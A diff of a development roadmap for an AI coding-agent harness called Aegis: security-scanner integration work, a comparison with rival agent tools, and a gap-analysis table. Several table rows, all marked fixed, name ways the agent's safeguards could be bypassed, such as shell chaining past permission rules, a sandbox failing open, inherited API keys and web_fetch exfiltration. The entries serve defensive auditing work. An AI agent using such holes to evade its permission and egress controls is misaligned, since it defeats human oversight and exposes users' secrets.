 - **P11.2 (SARIF-first normalization):** one shared `ParseSARIF` ingester (`internal/security/sarif.go`) replaces per-tool bespoke parsers for every SARIF-emitting scanner; only gitleaks (not SARIF-native) keeps a hand-written one.
 - **P11.3 (SAST depth):** opengrep (no-login, no-telemetry community fork) is the new default SAST engine, semgrep selectable; both use pinned rule packs, never `--config auto`. Four opt-in language engines added (gosec/bandit/brakeman/njsscan), which required a real default-enablement mechanism (`ScannerDescriptor.DefaultEnabled`) so opt-in tools don't silently turn themselves on the moment they ship.
 - **P11.4 (SCA depth + SBOM):** osv-scanner added as a new SARIF-native SCA scanner; grype's directory scan now prefers matching against a syft-generated CycloneDX SBOM (persisted to `.aegis/sbom.cdx.json`) over its own cataloger, falling back cleanly if syft is unavailable.
@@ -378,7 +301,7 @@ A user request to bring `internal/security`/`aegis scan`/`security_scan` — thr
 - **P11.9 (regression evals + provenance):** a golden-transcript test (`internal/security/regression_test.go`) drives the full pipeline over recorded fixtures with no scanner/network/container needed in CI, proving the P11.8 cross-tool dedup and all three baseline states end to end. Also closed a real gap found while implementing it: a configured scanner image was never actually validated as digest-pinned despite being documented as required — floating tags are now rejected (`digestPinReason`). A live ZAP capture against Juice Shop/WrongSecrets/VAmPI is documented follow-up in `testdata/README.md`, since no container runtime was available to run one this pass.
 - **P11.10 (guided scanner install):** approval-gated per-tool install (`aegis security install <tool>`) — shows the exact command and requires confirmation before ever touching the host; supply-chain hygiene favors package managers/checksummed binaries over `curl | sh`.
 - **P11.11 (security tool config + `/security-config`):** `security.tools.<name>` config (enabled/method/install/image) plus an interactive TUI form, so none of this requires hand-editing YAML.
-- **P11.12 (reachability analysis):** osv-scanner's `--call-analysis` (govulncheck-backed for Go, on by default) surfaces whether a vulnerable dependency's flagged code is actually *called*, not just present in the dependency tree — never inferred for unsupported ecosystems, since a wrong "unreachable" claim would understate real risk.
+- **P11.12 (reachability analysis):** osv-scanner's `--call-analysis` (govulncheck-backed for Go, on by default) surfaces whether a vulnerable dependency's flagged code is actually _called_, not just present in the dependency tree — never inferred for unsupported ecosystems, since a wrong "unreachable" claim would understate real risk.
 - **Follow-up, 2026-07-05 — install-from-wizard + `/scan`:** `/security-config` gained an action step per tool (Edit settings / **Install now (guided)** / Back) that runs the same confirmed guided install `aegis security install` does (factored into a shared `security.RunGuidedInstall`), then re-resolves availability so the list reflects the newly-installed binary without leaving the dialog. New `/scan [path|image <ref>|sbom [path]]` TUI command runs a scan directly against the daemon's workspace (`POST /security/scan`, new endpoint) and prints the report — no model turn spent, mirroring `aegis scan`.
 
 **Scope decisions kept deliberately narrow rather than over-built** (each a documented trade-off, not an oversight): no built-in image digest pins (P11.1); image scanning is host-binary only (P11.5); DAST v1 needs an already-running target (P11.7); the ZAP regression fixture is an explicitly labeled synthetic placeholder pending a live capture (P11.9); OWASP Dependency-Check remains opt-in-only with no built integration, no concrete demand yet (P11.4).
@@ -402,16 +325,17 @@ Tests: `internal/security/{method,sarif,scanners,sast,sbom,osv,dast,dedup,asvs,b
 What changed in the top-tier harnesses since the 2026-06-29 competitive analysis, and what it means for Aegis.
 
 **Claude Code** (the closest architectural relative):
+
 - **Agent Teams** (Feb 2026, with Opus 4.6) — peer sessions that message each other directly, claim tasks from a shared task list, and challenge each other's findings. Distinct from subagents (which report up to a parent). Aegis's swarm mailbox was the right substrate; P5.1 added the shared task list and peer messaging semantics.
-- **Skills with progressive disclosure** — only skill *name + description* load at session start; the full body loads on invocation. Addressed by P4.3.
+- **Skills with progressive disclosure** — only skill _name + description_ load at session start; the full body loads on invocation. Addressed by P4.3.
 - **Lifecycle hooks as user config** — shell commands / HTTP endpoints / LLM prompts firing on `PreToolUse`, `PostToolUse`, `Stop`, `SubagentStop`, `SessionStart`, `Notification`; exit code 2 vetoes a tool call. Addressed by P4.4.
 - **Deferred tools / ToolSearch** — tool schemas lazy-loaded via a search meta-tool instead of shipping every schema every turn. Addressed by P4.6.
 - **Dispatch & Channels** — programmatic task submission via API plus event streams for dashboards/alerting. No Aegis equivalent; not scheduled.
 - **Background agents finish the job** — commit, push, and open a draft PR when code work completes in a worktree. Addressed by P4.8.
 
-**opencode** — 75+ providers via Models.dev; TypeScript plugin system with 25+ lifecycle hooks; experimental LSP *tool* (go-to-definition, references, hover, call hierarchy — addressed by P5.2); session share links; desktop app + IDE extension (relates to open P6.5).
+**opencode** — 75+ providers via Models.dev; TypeScript plugin system with 25+ lifecycle hooks; experimental LSP _tool_ (go-to-definition, references, hover, call hierarchy — addressed by P5.2); session share links; desktop app + IDE extension (relates to open P6.5).
 
-**Codex CLI** — default-on sandboxing (container, plus OS-level seatbelt/Landlock when no container — addressed by P4.7); headline **token efficiency** (~4× fewer tokens than peers on Terminal-Bench — related to open P6.4/context-editing work, now shipped); runs as an MCP *server* (relates to open P6.3); native GitHub Actions + auto-PR; Rust rewrite.
+**Codex CLI** — default-on sandboxing (container, plus OS-level seatbelt/Landlock when no container — addressed by P4.7); headline **token efficiency** (~4× fewer tokens than peers on Terminal-Bench — related to open P6.4/context-editing work, now shipped); runs as an MCP _server_ (relates to open P6.3); native GitHub Actions + auto-PR; Rust rewrite.
 
 **Gemini CLI** — 1M context standard; Google Search grounding; 90+ extensions; subagents with parallel delegation (Apr 2026); being folded into the Antigravity platform.
 
@@ -423,57 +347,57 @@ What changed in the top-tier harnesses since the 2026-06-29 competitive analysis
 
 ## Appendix C — Gap Analysis
 
-| # | Category | Gap | Present in | Severity | Status |
-|---|----------|-----|-----------|----------|--------|
-| 1 | Context efficiency | Skills fully injected into system prompt (no progressive disclosure) | Claude Code | High | ✅ P4.3 |
-| 2 | Extensibility | No user-configurable lifecycle hooks | Claude Code, opencode | High | ✅ P4.4 |
-| 3 | Context efficiency | All 39+ tool schemas sent every turn; no deferred tool loading | Claude Code (ToolSearch) | High | ✅ P4.6 |
-| 4 | Automation | Headless `aegis chat` emits plain text only | Claude Code, Codex | High | ✅ P4.5 |
-| 5 | Safety | Local sandbox backend = no isolation | Codex CLI (default-on) | High | ✅ P4.7 |
-| 6 | Workflow | Git tool stops at commit; no push / PR creation | Claude Code, Codex | High | ✅ P4.8 |
-| 7 | Multi-agent | Subagents report up only; no shared task list or peer messaging | Claude Code Agent Teams | Medium | ✅ P5.1 |
-| 8 | Tools | LSP tools = diagnostics + references only | opencode | Medium | ✅ P5.2 |
-| 9 | Tools | Web search scrapes DuckDuckGo HTML | Gemini, Claude Code | Medium | ✅ P5.3 |
-| 10 | Automation | No notification channel for detached sessions | Claude Code, Channels | Medium | ✅ P5.4 |
-| 11 | TUI | No `@file#start-end` line-range syntax | opencode | Low | ✅ P5.5 |
-| 12 | TUI | No draft stash across sessions | opencode | Low | ✅ P5.6 |
-| 13 | Persistence | No mid-turn state persistence on crash | Crush, opencode | Low | ⬜ P6.1 |
-| 14 | Interop | Cannot act as an MCP server (A2A protocol evaluated and declined 2026-07-05 — no consumer) | ADK, Codex | Low | ✅ P6.3 |
-| 15 | Extensibility | Bundles install from local path only | opencode plugin ecosystem | Low | ✅ P5.7 |
-| 16 | Memory | Knowledge/longmem retrieval is BM25-only | Cursor, Devin | Low | ✅ P5.8 |
-| 17 | Reliability | No provider failover | Aider (litellm routing) | Low | ✅ P5.9 |
-| — | Context efficiency | No deterministic tool-result pruning before LLM compaction | Codex CLI (token efficiency) | Low | ✅ P6.4 |
-| 18 | Security | MCP tools hardcode capability as `network`, bypassing permission gate in any mode | — (internal audit) | **Critical** | ✅ P7.1 |
-| 19 | Security | Shell exec inherits full env (API keys); web_fetch enables exfil to public hosts | — (internal audit) | High | ✅ P7.2 |
-| 20 | Security | Permission allow-rule glob matches whole command string, bypassed by shell chaining | — (internal audit) | High | ✅ P7.3 |
-| 21 | Security | Sandbox backend silently fails open to unsandboxed exec | — (internal audit) | Medium | ✅ P7.4 |
-| 22 | Security | Bundle persona can silently escalate session to `auto` mode | — (internal audit) | Medium | ✅ P7.5 |
-| 23 | Security | No signature/checksum verification on git-URL bundle installs | opencode plugin registry | Medium | ✅ P7.6 |
-| 24 | Security | Deny rules silently no-op for tools with non-standard argument fields | — (internal audit) | Low | ✅ P7.7 |
-| 25 | Performance | Session store rewrites entire message/trace blob every turn — O(N²) over session life | — (internal audit) | High | ✅ P8.1 |
-| 26 | Performance | Knowledge semantic search loads full corpus (vectors + bodies) per query | — (internal audit) | Medium | ✅ P8.2 |
-| 27 | Performance | Swarm mailbox has no eviction, grows unbounded | — (internal audit) | Medium | ✅ P8.3 |
-| 28 | Performance | Token estimation double-scans full conversation per turn (local models) | — (internal audit) | Medium | ✅ P8.4 |
-| 29 | Performance | Memory relevance TF-IDF recomputed from scratch every call | — (internal audit) | Low-Med | ✅ P8.5 |
-| 30 | Performance | Write/execute tool calls unnecessarily serialize concurrent reads | — (internal audit) | Low | ✅ P8.6 |
-| 31 | Quality | No agent-behavior eval/regression harness | Codex, Claude Code (internal eval suites) | Medium | ✅ P9.1 |
-| 32 | Quality | Zero test coverage in trace/logging/api/client packages | — (internal audit) | Medium | ✅ P9.2 |
-| 33 | Security | In-process sub-agents bypass parent's contextual egress policy + text allow/deny rules (only mode is inherited) | — (service-interaction review) | **High** | ✅ P10.1 |
-| 34 | Security | Subprocess workers run the shell tool with no sandbox and a re-injected API-key env | — (service-interaction review) | **High** | ✅ P10.2 |
-| 35 | Security | Subprocess fan-out gets a fresh full BudgetUSD per worker (shared ledger can't cross process boundary) | — (service-interaction review) | Medium | ✅ P10.3 |
-| 36 | Quality | No eval scenario asserts a parent's deny/egress/budget still binds a spawned sub-agent | — (service-interaction review) | Medium | ✅ P10.4 |
-| 37 | Safety | Dollar-denominated budget/caps are a silent no-op for local (estimated-usage) + uncatalogued models — no working spend guardrail in the default local posture | — (provider-budgeting comparison) | **High** | ✅ P10.5 |
-| 38 | Security scanning | `Scanner.Available()` gates on a host binary; a clean machine silently skips every scanner and reports a scan it never ran | — (scan review) | High | ✅ P11.1 |
-| 39 | Security scanning | Container-image security entirely missing (`trivy fs` only, never `trivy image`/grype/hadolint/dockle) | — (scan review) | Medium | ✅ P11.5 (scoped: host-binary only) |
-| 40 | Security scanning | IaC coverage shallow — trivy config not fully exercised; deeper engine wanted (trivy expanded, not checkov: checkov OSS has no severity) | — (scan review) | Medium | ✅ P11.6 |
-| 41 | Security scanning | No DAST capability; OWASP ZAP automation requested (containerized, authorization-gated) | user request | High | ✅ P11.7 (v1 scope) |
-| 42 | Security scanning | Single SAST engine (semgrep `auto`, unpinned) | — (scan review) | Medium | ✅ P11.3 |
-| 43 | Security scanning | No way to install a missing scanner (or auto-pick host-binary vs container); missing tools silently skipped | user request | High | ✅ P11.10 |
-| 44 | Security scanning | No user configuration for which security tools to enable, run method (host/container/auto), or auto-install policy | user request | High | ✅ P11.11 (CLI + `/security-config` TUI form) |
-| 45 | Security scanning | No SCA breadth beyond trivy (osv-scanner/grype) or SBOM generation | — (scan review) | Medium | ✅ P11.4 |
-| 46 | Security scanning | SCA findings carry no reachability signal — a vulnerable *package* present reads the same as a vulnerable *function* actually called | user request | Medium | ✅ P11.12 |
-| 47 | Security scanning | Overlapping tools re-report the same finding; no accepted-risk allowlist; findings read as raw tool IDs with no recognized-standard mapping | — (scan review) | Medium | ✅ P11.8 |
-| 48 | Security scanning | No regression coverage over recorded scanner output; a configured `security.tools.<name>.image` was never actually validated as digest-pinned despite being documented as required | — (scan review) | Medium | ✅ P11.9 |
+| #   | Category           | Gap                                                                                                                                                                                | Present in                                | Severity     | Status                                        |
+| --- | ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- | ------------ | --------------------------------------------- |
+| 1   | Context efficiency | Skills fully injected into system prompt (no progressive disclosure)                                                                                                               | Claude Code                               | High         | ✅ P4.3                                       |
+| 2   | Extensibility      | No user-configurable lifecycle hooks                                                                                                                                               | Claude Code, opencode                     | High         | ✅ P4.4                                       |
+| 3   | Context efficiency | All 39+ tool schemas sent every turn; no deferred tool loading                                                                                                                     | Claude Code (ToolSearch)                  | High         | ✅ P4.6                                       |
+| 4   | Automation         | Headless `aegis chat` emits plain text only                                                                                                                                        | Claude Code, Codex                        | High         | ✅ P4.5                                       |
+| 5   | Safety             | Local sandbox backend = no isolation                                                                                                                                               | Codex CLI (default-on)                    | High         | ✅ P4.7                                       |
+| 6   | Workflow           | Git tool stops at commit; no push / PR creation                                                                                                                                    | Claude Code, Codex                        | High         | ✅ P4.8                                       |
+| 7   | Multi-agent        | Subagents report up only; no shared task list or peer messaging                                                                                                                    | Claude Code Agent Teams                   | Medium       | ✅ P5.1                                       |
+| 8   | Tools              | LSP tools = diagnostics + references only                                                                                                                                          | opencode                                  | Medium       | ✅ P5.2                                       |
+| 9   | Tools              | Web search scrapes DuckDuckGo HTML                                                                                                                                                 | Gemini, Claude Code                       | Medium       | ✅ P5.3                                       |
+| 10  | Automation         | No notification channel for detached sessions                                                                                                                                      | Claude Code, Channels                     | Medium       | ✅ P5.4                                       |
+| 11  | TUI                | No `@file#start-end` line-range syntax                                                                                                                                             | opencode                                  | Low          | ✅ P5.5                                       |
+| 12  | TUI                | No draft stash across sessions                                                                                                                                                     | opencode                                  | Low          | ✅ P5.6                                       |
+| 13  | Persistence        | No mid-turn state persistence on crash                                                                                                                                             | Crush, opencode                           | Low          | ⬜ P6.1                                       |
+| 14  | Interop            | Cannot act as an MCP server (A2A protocol evaluated and declined 2026-07-05 — no consumer)                                                                                         | ADK, Codex                                | Low          | ✅ P6.3                                       |
+| 15  | Extensibility      | Bundles install from local path only                                                                                                                                               | opencode plugin ecosystem                 | Low          | ✅ P5.7                                       |
+| 16  | Memory             | Knowledge/longmem retrieval is BM25-only                                                                                                                                           | Cursor, Devin                             | Low          | ✅ P5.8                                       |
+| 17  | Reliability        | No provider failover                                                                                                                                                               | Aider (litellm routing)                   | Low          | ✅ P5.9                                       |
+| —   | Context efficiency | No deterministic tool-result pruning before LLM compaction                                                                                                                         | Codex CLI (token efficiency)              | Low          | ✅ P6.4                                       |
+| 18  | Security           | MCP tools hardcode capability as `network`, bypassing permission gate in any mode                                                                                                  | — (internal audit)                        | **Critical** | ✅ P7.1                                       |
+| 19  | Security           | Shell exec inherits full env (API keys); web_fetch enables exfil to public hosts                                                                                                   | — (internal audit)                        | High         | ✅ P7.2                                       |
+| 20  | Security           | Permission allow-rule glob matches whole command string, bypassed by shell chaining                                                                                                | — (internal audit)                        | High         | ✅ P7.3                                       |
+| 21  | Security           | Sandbox backend silently fails open to unsandboxed exec                                                                                                                            | — (internal audit)                        | Medium       | ✅ P7.4                                       |
+| 22  | Security           | Bundle persona can silently escalate session to `auto` mode                                                                                                                        | — (internal audit)                        | Medium       | ✅ P7.5                                       |
+| 23  | Security           | No signature/checksum verification on git-URL bundle installs                                                                                                                      | opencode plugin registry                  | Medium       | ✅ P7.6                                       |
+| 24  | Security           | Deny rules silently no-op for tools with non-standard argument fields                                                                                                              | — (internal audit)                        | Low          | ✅ P7.7                                       |
+| 25  | Performance        | Session store rewrites entire message/trace blob every turn — O(N²) over session life                                                                                              | — (internal audit)                        | High         | ✅ P8.1                                       |
+| 26  | Performance        | Knowledge semantic search loads full corpus (vectors + bodies) per query                                                                                                           | — (internal audit)                        | Medium       | ✅ P8.2                                       |
+| 27  | Performance        | Swarm mailbox has no eviction, grows unbounded                                                                                                                                     | — (internal audit)                        | Medium       | ✅ P8.3                                       |
+| 28  | Performance        | Token estimation double-scans full conversation per turn (local models)                                                                                                            | — (internal audit)                        | Medium       | ✅ P8.4                                       |
+| 29  | Performance        | Memory relevance TF-IDF recomputed from scratch every call                                                                                                                         | — (internal audit)                        | Low-Med      | ✅ P8.5                                       |
+| 30  | Performance        | Write/execute tool calls unnecessarily serialize concurrent reads                                                                                                                  | — (internal audit)                        | Low          | ✅ P8.6                                       |
+| 31  | Quality            | No agent-behavior eval/regression harness                                                                                                                                          | Codex, Claude Code (internal eval suites) | Medium       | ✅ P9.1                                       |
+| 32  | Quality            | Zero test coverage in trace/logging/api/client packages                                                                                                                            | — (internal audit)                        | Medium       | ✅ P9.2                                       |
+| 33  | Security           | In-process sub-agents bypass parent's contextual egress policy + text allow/deny rules (only mode is inherited)                                                                    | — (service-interaction review)            | **High**     | ✅ P10.1                                      |
+| 34  | Security           | Subprocess workers run the shell tool with no sandbox and a re-injected API-key env                                                                                                | — (service-interaction review)            | **High**     | ✅ P10.2                                      |
+| 35  | Security           | Subprocess fan-out gets a fresh full BudgetUSD per worker (shared ledger can't cross process boundary)                                                                             | — (service-interaction review)            | Medium       | ✅ P10.3                                      |
+| 36  | Quality            | No eval scenario asserts a parent's deny/egress/budget still binds a spawned sub-agent                                                                                             | — (service-interaction review)            | Medium       | ✅ P10.4                                      |
+| 37  | Safety             | Dollar-denominated budget/caps are a silent no-op for local (estimated-usage) + uncatalogued models — no working spend guardrail in the default local posture                      | — (provider-budgeting comparison)         | **High**     | ✅ P10.5                                      |
+| 38  | Security scanning  | `Scanner.Available()` gates on a host binary; a clean machine silently skips every scanner and reports a scan it never ran                                                         | — (scan review)                           | High         | ✅ P11.1                                      |
+| 39  | Security scanning  | Container-image security entirely missing (`trivy fs` only, never `trivy image`/grype/hadolint/dockle)                                                                             | — (scan review)                           | Medium       | ✅ P11.5 (scoped: host-binary only)           |
+| 40  | Security scanning  | IaC coverage shallow — trivy config not fully exercised; deeper engine wanted (trivy expanded, not checkov: checkov OSS has no severity)                                           | — (scan review)                           | Medium       | ✅ P11.6                                      |
+| 41  | Security scanning  | No DAST capability; OWASP ZAP automation requested (containerized, authorization-gated)                                                                                            | user request                              | High         | ✅ P11.7 (v1 scope)                           |
+| 42  | Security scanning  | Single SAST engine (semgrep `auto`, unpinned)                                                                                                                                      | — (scan review)                           | Medium       | ✅ P11.3                                      |
+| 43  | Security scanning  | No way to install a missing scanner (or auto-pick host-binary vs container); missing tools silently skipped                                                                        | user request                              | High         | ✅ P11.10                                     |
+| 44  | Security scanning  | No user configuration for which security tools to enable, run method (host/container/auto), or auto-install policy                                                                 | user request                              | High         | ✅ P11.11 (CLI + `/security-config` TUI form) |
+| 45  | Security scanning  | No SCA breadth beyond trivy (osv-scanner/grype) or SBOM generation                                                                                                                 | — (scan review)                           | Medium       | ✅ P11.4                                      |
+| 46  | Security scanning  | SCA findings carry no reachability signal — a vulnerable _package_ present reads the same as a vulnerable _function_ actually called                                               | user request                              | Medium       | ✅ P11.12                                     |
+| 47  | Security scanning  | Overlapping tools re-report the same finding; no accepted-risk allowlist; findings read as raw tool IDs with no recognized-standard mapping                                        | — (scan review)                           | Medium       | ✅ P11.8                                      |
+| 48  | Security scanning  | No regression coverage over recorded scanner output; a configured `security.tools.<name>.image` was never actually validated as digest-pinned despite being documented as required | — (scan review)                           | Medium       | ✅ P11.9                                      |
 
 ---
 
